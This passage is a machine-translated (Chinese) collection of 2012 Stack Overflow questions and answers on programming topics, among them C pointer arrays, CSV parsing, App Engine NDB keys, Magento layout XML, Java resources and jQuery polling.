这给了我所有 z-index 高于 99 的元素。事实证明，ui 对话框通常设置为 1001 或 1002，因此@bfavaretto 列出的“99999”已经足够高了。

仍然不知道为什么会`return false;`产生错误，但我希望下一次更新能解决这个问题。

# c - 是否可以使用指向 char (char **pptr_char) 的指针来存储动态大小字符串的动态数量？

> ID：11271176
> 
> 赞同：0
> 
> 时间：2012-06-30T03:31:22.503
> 
> 标签：c, memory, pointers

变量`char **pptr_char`以 being 开头`NULL`。但是随着程序的进行，我们从用户那里获取字符串输入。每个字符串都存储在`**pptr_char`其中，因此需要在 X 和 Y 维度上动态分配内存。这在C中可能吗？

由于所有字符串的长度都不相同，指针算术将如何工作，即`*ptr_char+1`转到下一个字符串？

知道该怎么做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T03:45:08.403

对的，这是可能的。你会使用`ptr_char + i`移动到第`i`th 字符串。字符串的长度不同并不重要。重要的是**指针**的长度相同，当然它们是相同的。

```
 Points to memory location      Memory location contains
ptr_char            X                        a pointer to string1 (string could live anywhere)
ptr_char + 1        X+4 (or 8 for 64-bit)    a pointer to string2 (string could live anywhere)
ptr_char + 2        X+8 (or 16)              a pointer to string3 (string could live anywhere) 
```

因此，您首先分配一块内存来保存 N `char*`（该块开始一个内存位置`X`（当然，这`X`是操作系统为您选择的任何内容 - 您无法控制）。

`i`然后为th 字符串分配内存并将`i`th设置`char*`为指向该内存。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:00:38.380

`char **pptr_char`是一个字符串数组（字符指针）。`pptr_char[0]`是第一个指针，`pptr_char[1]`是第二个指针，依此类推，这些指针指向什么并不重要。如果要将字符串存储在连续的内存区域中，可以执行以下操作：

```
pptr_char    = (char**)malloc(20*sizeof(char*)); // say we have 20 strings max
pptr_char[0] = (char*) malloc(large chunk size)
strcpy(pptr_char[0], "string0");
pptr_char[1] = pptr_char[0] + strlen(pptr_char[0]+1);
strcpy(pptr_char[1], "string1");
pptr_char[2] = pptr_char[1] + strlen(pptr_char[1]+1);
.... 
```

# c# - 读取 CSV 文件 Linq

> ID：11271180
> 
> 赞同：0
> 
> 时间：2012-06-30T03:33:16.593
> 
> 标签：c#, linq

我的数据如下，

姓名、出生日期、地点、资格
"Ranjan,Priya",01/01/1988,"Pune,Maharashtra",B.Tech
"Mayank,Agrawal",05/05/1990,"Ranchi,Rajsthan",BCA

当我使用拆分属性和逗号作为分隔符时，我的名称和位置值被拆分但它是一个值。然后如何使用 linq 将名称和位置作为单个值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T03:45:45.073

不会真的和Linq一起去这个。RegEx 更适合自然，而且，这个问题已经被[其他人解决了](http://geekswithblogs.net/mwatson/archive/2004/09/04/10658.aspx)。这就是我发现这个的地方：

```
 protected virtual string[] SplitCSV(string line)
  {         System.Text.RegularExpressions.RegexOptions options = ((System.Text.RegularExpressions.RegexOptions.IgnorePatternWhitespace | System.Text.RegularExpressions.RegexOptions.Multiline) 
        | System.Text.RegularExpressions.RegexOptions.IgnoreCase);
     Regex reg = new Regex("(?:^|,)(\\\"(?:[^\\\"]+|\\\"\\\")*\\\"|[^,]*)", options);
     MatchCollection coll = reg.Matches(line);
     string[] items = new string[coll.Count];
     int i = 0;
     foreach(Match m in coll)
     {
        items[i++] = m.Groups[0].Value.Trim('"').Trim(',').Trim('"').Trim();
     }
     return items;
  } 
```

# ruby - 创建新文件后刷新当前工作目录

> ID：11271185
> 
> 赞同：1
> 
> 时间：2012-06-30T03:33:58.343
> 
> 标签：ruby

例如，我的工作目录名为“abc”（空目录），在这里，我启动了一个 ruby​​ 脚本，它将在当前目录下创建一个新目录和文件，例如“abc/a/a.file”。当它需要在这个 ruby​​ 脚本的同一进程中读取这个文件时（从不关闭），它不知道它（新文件）。所以，我需要告诉当前的 ruby​​ 进程来刷新自己当前工作的已知目录。

我在谷歌中找不到任何答案，感谢能帮助解决这个问题的人。我只是让当前进程知道并重新读取自己创建的新文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T15:40:16.247

对于当前目录，该进程正在使用：

```
Dir.pwd 
```

对于运行脚本的目录：

```
File.dirname(__FILE__) 
```

对于您创建的文件所在的目录：

```
f = File.new( "blah.rb", "w" )
# => #<File:blah.rb>
File.dirname f
# => "." 
```

我希望这能回答你的问题。

* * *

如果你知道目录：

```
dir_name = "/my/amazing/project/"

# this returns an array of file names (no dot files) - but just the names.
files = Dir.new(dir_name).entries.reject{|f| f.start_with? "." }

# this will give you an array with each entry being the full path to each file.
files = Dir.new(dir_name).entries.reject{|f| f.start_with? "." }.map{|f| File.expand_path File.join( dir_name, f ) } 
```

在 irb 中尝试上面的代码，只需替换`dir_name`为目录路径，甚至`"."`.

# c++ - 创建动态变量

> ID：11271187
> 
> 赞同：3
> 
> 时间：2012-06-30T03:34:27.470
> 
> 标签：c++, macros, user-input

是的，我知道动态变量在 C++ 中是不可能的。我正在寻找的是一种解决方法。

这个想法基本上是这样的。我有一堆数学模型。它们都具有完全相同的形式，除了

1.  几个函数的数学定义
2.  所需的常量：它们的名称、数量和值。

常数的值可能会在实验之间发生变化，但其他一切都是材料模型本身的属性。模型的常量参数在输入文件中以表格形式给出

`variable_A=2.0`

材料模型（包括所有功能）以前是通过生成代码制作的，通过 Maple 从抽象数学表达式生成，并带有一个很好的 GUI 环境来启动。由于多种原因，这现在很遗憾地被打破了。由于其他一些工作，模型现在在代码中完全相同，除了它们在形式描述上的不同之处。我没有使用整个单独的程序来生成此代码（目前已损坏，并且我们曾经拥有），而是在寻找一种更简单的替代方案，因为现在我只需要在给定文件中大约 20 行来区分一种材料与其他。然而，实现这些模型的用户并不需要任何 C++ 知识。所以虽然我可以简单地要求他们检查文件并在各个地方进行更改，*在一个地方*并以这种方式定义他们的模型，而无需查看其余代码。

用户定义的函数如下所示。

```
double myfunction(double arg1, double arg2, vector arg3 ) \\just an example
{
    ...
    ...
    double a=database.find_constant("a_const");
    double b=database.find_constant("b_const");
    return sqrt(a*3+pow(b,2)-a/b)+...; \\still example pseudocode
} 
```

顶部的省略号相当难看（代码不错，只是语法繁重且无关紧要），因此我不希望最终用户不得不处理它们。我的问题可能可以通过示例更好地描述：

我最初的计划是在顶部使用宏（是的，我知道，*恐怖*），这样就可以变成类似

```
 #define A database.find_constant("a_const")
 #define FUNCTION pow(A-2,3)   
 ...
double myfunction(...)
{
    ...
    return FUNCTION;
} 
```

但后来我发现你不能嵌套宏。回想起来很明显，但我离题了。然后我意识到我可以改变`#define A`语句来创建`A`一个全局变量。然后我什至考虑到全局变量。基本上，我所有将这一切都放在一个用户不需要太多 C++ 知识的地方的尝试都是荒谬的和/或非常不安全的。

通常我讨厌问这种开放式的问题，但我*真的*不想让自己头疼。我只会在这个项目上工作很短的时间，所以设计某种形式的 UI 和/或生成代码是不切实际的。我目前正在寻求“概念证明”。

有没有比让他们通过模型并直接更改函数中所需的行更好的方法呢？

编辑：我没有编写整个项目，也不是最初打算以这种方式工作。我们用于生成这些文件的原始工具使用 Maple 的代码生成，其中函数和变量以 Maple 语法在一个漂亮的 GUI 中输入。不幸的是，GUI 似乎不再（始终如一地）工作，并且一旦我们切换版本，Maple 返回的代码停止产生正确的结果：我们不确定问题到底是什么，我们现在只是在探索其他途径. 新文件也*很多*比以前的更相似（由于其他工作），这是新技术的动机的一部分。如果我只需要几行代码以一种简单的方式协同工作，我希望我可以绕过代码生成。这不是“为我修好它！” 问题，我只想了解其他选项可能是什么。是的，我知道一开始情况并不好，如果从一开始就计划好了，就不会这样做。但这种设置可能是暂时的，正如我所说，它更像是一个概念证明而不是其他任何东西。

希望现在问题更清楚了。我的问题特别是以一种简单易用的方式将所有内容分组到一个地方。感谢您的耐心等待。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T04:01:35.193

变量本身实际上可以很容易地处理：读入值并将它们放入 a `std::map<std::string, double>`（或者，如果值都是整数，`int`而不是）。`double`例如：

```
std::map<std::string, double> values;

// Code to read name and value from the file goes here.
// Then something like:
values[name] = value; 
```

其余的——评估表达式，是一个更深层次的主题。不过，它的代码很容易找到（例如[muParser](http://muparser.sourceforge.net/)）。我猜大多数人都有自己的支持变量，因此您可能不需要编写自己的显式地图。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-06T07:03:01.627

您可以尝试将各种函数组封装在匿名结构中，以实现类似于宏的“行为”但不是：

```
struct
{
    double find_constant(const char* s) { do-stuff...; }
    double calc_value(int a, int b) { do-stuff...; }
    ...
} GeneralStuff; 
```

使用宏访问此结构中的函数：

`#define DoStuff GeneralStuff`

并在您的代码中访问它：

```
...
DoStuff.find_constant("a_const");
... 
```

If a user needs to change the code, he makes a copy of the struct, apply the changes, and redefines the macro:

```
struct
{
    ...changed code...
} MyStuff;

#define DoStuff MyStuff 
```

These would be the only changes needed, if I understand your question correctly.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T03:56:30.013

您需要的只是让他们在输入文件中编写表达式，然后自己解析它并从数据库中查找任何未知引用，然后对其进行评估。如果您不需要非常高的评估性能，这对您和他们来说都相对简单。例如，您可以使用 Lua 轻松自然地执行此操作——您所要做的就是`__index`在全局表上设置元表值以查找数据库，瞧——所有数据库常量都是“全局”Lua 值.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-30T04:06:06.050

这可能只会引起更多的麻烦，但对于未来这样的事情，可能会考虑使用 boost.spirit 来构建一个实际的解析器，或者可能是 proto 来构建一种特定于域的语言。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-30T05:19:43.493

(1) 如果您希望用户查看和编辑最少的代码，您可能会考虑滥用预处理器，将代码拆分为数学之前的位 (BEGIN_ROBERTS_MAGIC.inl) 和数学之后的代码 (END_ROBERTS_MAGIC.inl)

BEGIN_ROBERTS_MAGIC.inl（您的代码）

```
#include <cmath>
...otherstuff
double function(*args go here*)
{
    ....prep work
    //this file ends right before the lines with the math 
```

END_ROBERTS_MAGIC.inl（您的代码）

```
 //this file begins right after the lines with the math
}
...otherstuff 
```

STUPID_PHYSICS_MODEL.cpp（他们的代码）

```
#include "BEGIN_ROBERTS_MAGIC.inl"

double a=database.find_constant("a_const"); //or double a = constant["a"];
double b=database.find_constant("b_const"); //or double b = constant["b"];

return sqrt(a*3+pow(b,2)-a/b)+...;

#include "END_ROBERTS_MAGIC.inl 
```

这意味着其他人看到的文件只有五行左右的代码，看起来非常简单，一点也不吓人，所有的魔法都隐藏在他们看不到的其他文件中。

(2) 正如其他人所建议的那样，您可以将用户的代码放入不属于 C++ 代码的脚本中（通过 Spirit、lua、javascript 或任何其他脚本语言），这意味着您不必为每个模型重新编译，并且您也可以在运行时添加或删除实际的全局变量，但这更复杂。

# python - TypeError：“键”对象不可调用

> ID：11271188
> 
> 赞同：0
> 
> 时间：2012-06-30T03:34:42.523
> 
> 标签：python, google-app-engine, google-cloud-datastore

我正在尝试使用 python 中的以下代码在谷歌应用商店中调用实体的特定模型：

```
class Profile(BlogHandler):
    def get(self):
        user = users.get_current_user()

        if user:
            user = users.get_current_user()
            user_db_qry = User.query(User.theid == user.federated_identity())
            #theid is how I have saved each user's federated id in the User entity in the datastore
            user_db_list = user_db_qry.fetch(1)
            profile_user = user_db_list[0]
            profile_id = profile_user.key().id_or_name()
            #I am trying to get the datastore created ID/Name here and this is the line that gives me the error

            self.redirect('/profile/%s' % str(profile_id))
        else:
            self.redirect("/about") 
```

所以我不太确定出了什么问题。我的查询不正确吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T04:15:21.463

*首先，我对 GAE 没有任何经验。这个答案完全基于 API 文档*

文档声称只有模型实例具有`key()`返回[`Key`类](https://developers.google.com/appengine/docs/python/datastore/keyclass#Key_id_or_name)的方法。不过，这个[`User`类](https://developers.google.com/appengine/docs/python/users/userclass#User_nickname)似乎是它自己的实体。

您可以使用直接方法，而不是尝试访问密钥实例：

```
profile_id = profile_user.user_id()
profile_nick = profile_user.nickname() 
```

如果要调查`key`用户成员包含的内容，可以通过检查它来进行调试：

```
print type(profile_user.key)
print dir(profile_user.key) 
```

**更新**

在您的评论中，您澄清说您正在使用解释问题的[`NDB`变体。](https://developers.google.com/appengine/docs/python/ndb/)[NDB Key Class](https://developers.google.com/appengine/docs/python/ndb/keyclass)与DB [Key Class](https://developers.google.com/appengine/docs/python/datastore/keyclass#Key_id_or_name)不同。它没有`id_or_name()`方法。它有什么：

> **id()**返回最后一个 (kind, id) 对中的字符串或整数 id，如果键不完整，则返回 None。
> 
> **string_id()**返回最后一个 (kind, id) 对中的字符串 id，如果键具有整数 id 或不完整，则返回 None。
> 
> **integer_id()**返回最后一个 (kind, id) 对中的整数 id，如果键具有字符串 id 或不完整，则返回 None。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T03:37:42.090

```
 profile_id = profile_user.key().id_or_name() 
```

不需要第一组括号。

```
 profile_id = profile_user.key.id_or_name() 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T05:26:20.827

根据您在其他地方写的内容，您是如何为实体分配密钥的？你是给他们取名字吗？

如果您使用的关键路径以这样的结尾：（注意：我*不是*指父级，只是关键路径）

```
ndb.Key.from_path(..."User", "harold") 
```

对于您的键，则键将为其 id 返回 None 但*应该*（如果`ndb`与 类似`db`）具有 name 属性。

解决这个问题的最简单方法是在 SDK 中运行您的应用程序，然后转到`http://localhost:8080/_ah/admin`，打开交互式控制台并尝试（可能是所有）属性，直到获得所需的属性。使用应用程序引擎，它通常有助于捕获奇怪的错误（例如，如果您尝试将它们与 kewyord 参数而不是位置参数一起使用，许多 API 调用会特别失败，等等）

我还建议尝试从您生成的密钥`ndb.Key.from_path()`到用户实例进行查找，看看您是否正确实例化/获取/无论您的密钥。

# iphone - AdMob 错误 - 必须在调用 loadRequest 之前设置 GADBannerView 的 rootViewController 属性：

> ID：11271190
> 
> 赞同：2
> 
> 时间：2012-06-30T03:35:24.613
> 
> 标签：iphone, ios5, admob, xcode4.3, adwhirl

我正在尝试设置一个简单的单视图 iOS5 iPhone 应用程序（带有 AppDelegates、ViewControllers 和 MainStoryboard），并安装了 AdWhirl（包括支持文件 - AdWhirl、GoogleAdMobAdsSDK 和 TouchJSON） - 仅使用 iAds 和 AdMob。此时应用程序中没有其他内容。这将在未来的应用程序中用作我自己的起始模板。

由于我只是在学习自己编程，因此我遵循了一些不同的教程来尝试弄清楚如何设置它。我已经让 iAd 显示并正常工作，并且 iAd 确实在 AdWhirl 中注册了视图，因此它们似乎工作正常。但在尝试调用 AdMob 广告时，我在日志中收到此错误：

> 在调用 loadRequest 之前必须设置 GADBannerView 的 rootViewController 属性：

在这一点上，我已经搜索并找到了超出我知识范围的答案。有人可以解释我需要做什么以及我需要在哪里做来修复这个错误吗？我认为我需要更改我尝试过的“GoogleAdMobAdsSDK”中的“GADBannerView.h”文件，但到目前为止没有成功。

如果有任何其他问题，或者如果您想查看项目文件或代码（就像我说的到目前为止应用程序中没有其他内容），请告诉我。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-01T03:54:05.723

好吧，我终于想通了。对于其他有此错误的人，这就是我解决它的方法。

在“ViewController.m”文件中，我更改了以下代码，现在 iAds 和 AdMob 广告都可以正常显示，没有错误。

```
- (UIViewController *)viewControllerForPresentingModalView {
    //return UIWindow.viewController;
    return [(AppDelegate *)[[UIApplication sharedApplication] delegate] viewController];
} 
```

到： 

```
- (UIViewController *)viewControllerForPresentingModalView {
    //return UIWindow.viewController;
    return self;
} 
```

# sql - Oracle 字符串连接属性

> ID：11271192
> 
> 赞同：2
> 
> 时间：2012-06-30T03:35:28.140
> 
> 标签：sql, vb.net, oracle

我一直在网站上查看有关字符串连接及其参数的信息。我已经实现了与此代码的连接，但我不知道如何将参数与用户输入连接起来。

这是我的代码：

```
Imports System
Imports System.Data
Imports System.Data.OracleClient

Module OracleConnect

   Sub Main()
      Dim connString As String = "server = o92; uid = java2s;password = password;"

      'Create connection
      Dim conn As New OracleConnection(connString)

      Try
         conn.Open()
         Console.WriteLine("Connection Opened")

         Console.WriteLine("Connection Properties")
         Console.WriteLine("- ConnectionString : {0}", conn.ConnectionString)
         Console.WriteLine("- ServerVersion : {0}", conn.ServerVersion)
         Console.WriteLine("- State : {0}", conn.State)

      Catch ex As OracleException
         Console.WriteLine("Error: " & ex.ToString())
      Finally
         ' Close Connection
         conn.Close()
         Console.WriteLine("Connection Closed")

      End Try

   End Sub 
```

关键是我想用用户输入参数更改连接字符串，因此它将是一个文本框，服务器和密码以及侦听器将跟随用户的输入。

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T06:16:57.497

你可以试试这样的函数，传入你的文本框的值；

```
Public Function connectionString(server As String, uid As String, password As String) As String
    Dim tmpServer(2) As String

     tmpServer(0) = "server = " & server
    tmpServer(1) = "uid = " & uid
    tmpServer(2) = "password = " & password

    Return String.Join("; ", tmpServer) & ";"
End Function 
```

用法会。

```
Dim conn As New OracleConnection(connectionString(TextBox1.Text, TextBox2.Text, TextBox3.Text)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T06:00:03.553

看起来您启动了一个控制台项目而不是一个 winform 项目。后者将允许您将文本框和按钮等控件拖放到表单上，以便用户能够填写连接字符串字段。

然后你可以像这样连接连接字符串：

```
Dim connString As String = "server = " & Textbox1.Text &"; uid = " & Textbox2.Text &";password = " & Textbox3.Text &";" 
```

[或者您可以使用控制台应用程序并使用main 方法中](http://msdn.microsoft.com/en-us/library/ms235406%28v=vs.80%29.aspx)的 args 使用命令行参数启动它

# xml - 使用 local.xml 更改或重新排列 Magento 登录和注销（顶部链接）位置

> ID：11271194
> 
> 赞同：4
> 
> 时间：2012-06-30T03:35:55.170
> 
> 标签：xml, magento, hyperlink

我想使用`local.xml`-- 特别是登录/注销链接重新排列我的顶级链接。如果不删除链接然后重新添加它们并修改它们的位置标签，这是否可能？

当前（默认情况下）登录和注销设置为位置 100 in `customer.xml`：

```
<customer_logged_in>
    <reference name="top.links">
        <action method="addLink" translate="label title" module="customer">
            <label>Log Out</label>
            <url helper="customer/getLogoutUrl"/>
            <title>Log Out</title>
            <prepare/>
            <urlParams/>
            <position>100</position>
        </action>
    </reference>
</customer_logged_in>

<customer_logged_out>
    <reference name="top.links">
        <action method="addLink" translate="label title" module="customer">
            <label>Log In</label>
            <url helper="customer/getLoginUrl"/>
            <title>Log In</title>
            <prepare/>
            <urlParams/>
            <position>100</position>
        </action>
    </reference>
</customer_logged_out> 
```

我希望他们都在位置 1（通过`local.xml`）。

我知道`setAttribute`操作方法，但我不确定在这种情况下如何使用它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T14:33:26.450

我还没有找到更有效的方法来执行此操作`local.xml`，因此我删除了链接并使用修改后的位置参数重新添加它们：

```
<customer_logged_in>
    <reference name="top.links">
        <action method="removeLinkByUrl"><url helper="customer/getLogoutUrl"/></action>
        <action method="addLink" translate="label title" module="customer">
            <label>Log Out</label>
            <url helper="customer/getLogoutUrl"/>
            <title>Log Out</title>
            <prepare/>
            <urlParams/>
            <position>4</position>
            <liParams>id="top-logout"</liParams>
            <aParams/>
        </action>
    </reference>
</customer_logged_in>

<customer_logged_out>
    <reference name="top.links">
        <action method="removeLinkByUrl"><url helper="customer/getLoginUrl"/></action>
        <action method="addLink" translate="label title" module="customer">
            <label>Log In</label>
            <url helper="customer/getLoginUrl"/>
            <title>Log In</title>
            <prepare/>
            <urlParams/>
            <position>4</position>
            <liParams>id="top-login"</liParams>
            <aParams/>
        </action>
    </reference>
</customer_logged_out> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-02T07:02:40.843

该`top.links`块的`addLink`方法用于向该块添加链接。当您查看该方法的主体时，您会看到 position 参数用于确定链接的位置。

链接位置由这段代码决定：

```
 $this->_links[$this->_getNewPosition($position)] = $link;
 if (intval($position) > 0) {
     ksort($this->_links);
 } 
```

`_getNewPosition()`方法检查该特定位置是否仍然可用。如果不是，那么它将搜索最近的可用链接（即，在位置 1 只能有一个链接）。检索到链接的正确位置后，对整个链接数组进行排序。

在您的情况下，登录和注销链接的位置默认设置为 100（请参阅`<position />`标签）。因此，您应该将布局 xml ( ) 复制`customer.xml`到主题的布局目录中，并将位置参数更改为 1。

如果这些链接不会在位置 1 呈现，则意味着其他链接的位置在您之前设置为 1。在这种情况下，只需将该链接的位置更改为更大的数字。请注意，您不能使用小于或等于零的位置值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-07-20T12:28:10.743

以下是Top Links的位置编号。

基于这些，您可以设置或更改顶部链接的位置

```
My Account = 10 
Whislist = 30 
Mycart = 50 
Checkout = 60
Login/Logout = 100 
```

# ios - 我正在尝试使用 xCode 4.4 构建归档应用程序，但出现此错误

> ID：11271203
> 
> 赞同：0
> 
> 时间：2012-06-30T03:38:36.853
> 
> 标签：ios, xcode, validation, titanium, archiving

我正在尝试使用 xCode 4.4 构建归档应用程序（来自 Titanium Mobile），但我收到此错误：

```
 Validate "/Users/admin/Library/Developer/Xcode/DerivedData/Sweet_Dream-gmqsujzdxwsgxtdhddwaatzuspsq/Build/Products/Release-iphoneos/Sweet Dream.app"
    cd "/Users/admin/Desktop/TitaniumWorkspace2/Sweet Dream/build/iphone"
    setenv PATH "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin:/Applications/Xcode.app/Contents/Developer/usr/bin:/usr/bin:/bin:/usr/sbin:/sbin"
    setenv PRODUCT_TYPE com.apple.product-type.application
    /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/Validation "/Users/admin/Library/Developer/Xcode/DerivedData/Sweet_Dream-gmqsujzdxwsgxtdhddwaatzuspsq/Build/Products/Release-iphoneos/Sweet Dream.app"

warning: iPhone/iPod Touch: appicon.png: icon dimensions (512 x 512) don't meet the size requirements.  The icon file must be 57x57 pixels, in .png format (-19014)
Unable to validate your application. - (null)

Command /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/Validation failed with exit code 1 
```

非常感谢任何帮助。

授予。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T04:00:12.963

应用程序图标未在您的 xcode 中设置，它说明 appicon.png 的尺寸为 515x515，但应该为 57x57。因此，在项目的构建设置中更改应用程序图标

# java - InputStream 不能为空/不能访问另一个包内的文件

> ID：11271204
> 
> 赞同：4
> 
> 时间：2012-06-30T03:38:50.717
> 
> 标签：java

我正在尝试从 JAR 文件中的另一个包中的一个类访问文件。更具体地说，我在其中创建输入流的类名为 ClassA.class 并且位于包 com.something.somethingelse 中，而我尝试使用输入流打开的文件位于包 com 中。东西。存储。我正在调用 getResourceAsStream 方法，如下所示：

```
 ClassA.class.getResourceAsStream("/com/something/storage/MyFile.txt"); 
```

但是，它会引发 IllegalArgumentException，说明输入流不能为空。我尝试将文本文件存储在与 ClassA 相同的包中，但问题没有出现。只有当它存储在另一个包中时才会发生这种情况。请帮忙。

知道我正在执行此操作的方法是静态方法也可能会有所帮助。这和问题有关系吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T09:32:44.660

在你的班级里面`com.something.somethingelse`打开流：

```
getClass().getClassLoader().getResourceAsStream("com/something/storage/MyFile.txt"); 
```

使用`getClassLoader()`您以绝对方式指定包路径（没有第一个`/`）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T05:25:12.483

ClassA.class.getResourceAsStream("/com/something/storage/MyFile.txt");

返回 null 因为文件“/com/something/storage/MyFile.txt”不存在

# python - Python泡菜的任何替代品？

> ID：11271205
> 
> 赞同：0
> 
> 时间：2012-06-30T03:38:53.643
> 
> 标签：python, object, ironpython, pickle

当我尝试使用 pickle 加载转储文件时，python 崩溃并出现代码 CLR20r3 ！我想知道pickle是否有任何替代品，可以转储python对象并将其加载回来。第三方库是可以接受的。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-30T04:28:19.550

我认为对于您提供的信息，您将获得的最佳答案是...

没有其他序列化格式会使您的情况变得更好。`pickle`比 JSON 更优雅地处理原生 Python 对象。任何其他格式都需要您定义处理程序来帮助它序列化它无法处理的对象。

对你来说最好的方法是尝试解决泡菜失败的**原因。**

# java - 2个二叉树的交集引发堆栈溢出错误

> ID：11271206
> 
> 赞同：0
> 
> 时间：2012-06-30T03:38:55.687
> 
> 标签：java, binary-tree

我正在尝试使两棵二叉树相交，并使用相同的节点创建一棵新的二叉树，但以下会产生 stackOverflow 错误。谁能帮我？

```
private OrderedSet<E> resultIntersect = new OrderedSet<E>();

public OrderedSet<E> intersection(OrderedSet<E> other) {
    OrderedSet<E> result = new OrderedSet<E>();
    if (other.root == null || root == null)
        return result;
    else if (height() == 0 && other.height() == 0
            && other.root.data.equals(root.data)) {
        result.insert(root.data);
        return result;
    } else {
        intersection(other, root, other.root);
        result = resultIntersect;
    }
    return result;
}

private void intersection(OrderedSet<E> other, TreeNode root1,
        TreeNode root2) {
    if (root1 == root2) {
        resultIntersect.insert(root1.data);
    }
    if (root1 == null || root2 == null) {
        return;
    }
    intersection(other, root1.left, root2.left);
    intersection(other, root1.right, root2.right);
} 
```

*编辑*

我觉得这更接近我需要的方式，但我仍然得到错误。

```
private OrderedSet<E> resultIntersect = new OrderedSet<E>();

public OrderedSet<E> intersection(OrderedSet<E> other) {
    OrderedSet<E> result = new OrderedSet<E>();
    result = resultIntersect;
    return result;
}

private void intersection(OrderedSet<E> other, TreeNode t) {
    if (other.contains(t.data)) {
        resultIntersect.insert(t.data);
    }
    if(t.left != null)
        intersection(other, t.left);
    if(t.right != null)
        intersection(other, t.right);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T03:59:01.633

我不知道具体问题，但有一些问题。

1.  为什么将“其他”传递到第二个路口（从未使用过）？
2.  插入集合后不应该返回吗？
3.  您不应该传入本地 OrderedSet （称为`result`）并插入其中，而不是全局变量吗？
4.  您不应该比较 root1 和 root2 的数据而不是节点本身吗？
5.  第二次回报是多余的
6.  在测试 null*之前*取消引用根
7.  初始测试是不必要的

清理这些缺陷，我得到：

```
public OrderedSet<E> intersection(OrderedSet<E> other) {
    OrderedSet<E> result = new OrderedSet<E>();
    intersection(result, root, other.root);
    return result;
}

private void intersection(OrderedSet<E> result, TreeNode root1,
        TreeNode root2) {
    if (root1 == null || root2 == null) {
        return;
    }
    if (root1.data == root2.data) {
        result.insert(root1.data);
    }
    intersection(result, root1.left, root2.left);
    intersection(result, root1.right, root2.right);
} 
```

我不知道这是否可行，但它更接近

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:00:11.620

堆栈溢出错误表明在达到堆栈限制之前存在没有触底的递归。主要嫌疑人是`private void intersection`方法。如果输入是正确的二叉树，那么`(root1 == null || root2 == null)`应该在某个时候达到条件——但是对于一个非常大的、不平衡的二叉树来说，这可能需要很长时间，或者如果“二叉树”有问题并且在某处有一个循环，则永远不会. 任何一种情况都可能是溢出的原因。

我还要指出，`if (root1 == root2)`同一方法中的条件可能没有达到预期的效果：参数`root1`和`root2`可能不是同一个对象，因此该条件几乎肯定是错误的。其他一些`equals()`基于比较可能更合适。

# javascript - 使用 Javascript 或 Jquery 操作 API 提要

> ID：11271207
> 
> 赞同：0
> 
> 时间：2012-06-30T03:39:02.973
> 
> 标签：javascript, jquery, json, api

我是一个初学者，所以如果这个问题很初级，我很抱歉。

我有一个数据 api，它以这种格式返回一个 JSON 对象：

```
{"Variable": "Number", "Variable2": "Number2"}; //(yes the number is returned as a string) 
```

我想创建一个页面，其中对象（“Number”和“Number2”）的值不断更新，因为值不断变化，但整个页面不需要刷新。

[http://sendgrid.com](http://sendgrid.com)有一个我想做的很好的例子。

任何帮助都会很棒！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T03:52:44.743

处理不断变化的数据的方法是使用 setTimeout。还有另一种方法称为 setInterval，但最好将 setTimeout 与递归函数一起使用。这样，如果操作花费的时间比预期的要长，计时器就不会不同步。通过示例演示：

```
function updateCounter() {
 var timer; 

 document.getElementById("counter").innerText(data.Variable);

 timer = setTimeout(updateCounter, 50);

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:03:51.903

您可以使用您的数据向您的 api 发送请求`setInterval()`并更新您的目标元素。

***只是一个例子：***

```
function updater() {
  $.ajax({
    url: 'src_to_script',
    dataType: 'json',
    sucess: function(data) {

       // updating your target elements
       $('#some_item1').text( data.Variable);
       $('#some_item2').text( data.Variable2);

       // call updater with 5 seconds interval
       setInterval(updater, 5000);

    }
  });
}

// initial call to updater
updater(); 
```

# javascript - 即使我遵循了 Fusion Tables 示例代码，我的 Fusion Tables 也不会按照我想要的方式设置样式。我究竟做错了什么？

> ID：11271209
> 
> 赞同：0
> 
> 时间：2012-06-30T03:39:21.813
> 
> 标签：javascript, google-fusion-tables

我试图控制我的地图是什么颜色，但它似乎不起作用。

我按照[谷歌的示例代码](https://developers.google.com/maps/documentation/javascript/layers#fusion_table_styles)，但无济于事。我的代码如下。设置地图样式的尝试从第 132 行开始。这些评论对我来说只是有用的提示，因为我刚刚开始接触 JavaScript 和 Fusion Tables API。

```
 <!DOCTYPE html>
<html>
  <head>
  <style>
    #map-canvas { width:800px; height:600px; }
  </style>
  <script type="text/javascript"
    src="http://maps.google.com/maps/api/js?sensor=false">
  </script>
  <script type="text/javascript">
    var map;
    var layer;

     var cz = {
    center: new google.maps.LatLng(40, -95),
        zoom: 4 
     };

     var locationColumn = 'geometry';
     var tableRegion = 4437529;

     var mapStyle = [
        {
          featureType: 'all',
          elementType: 'all',
          stylers: [
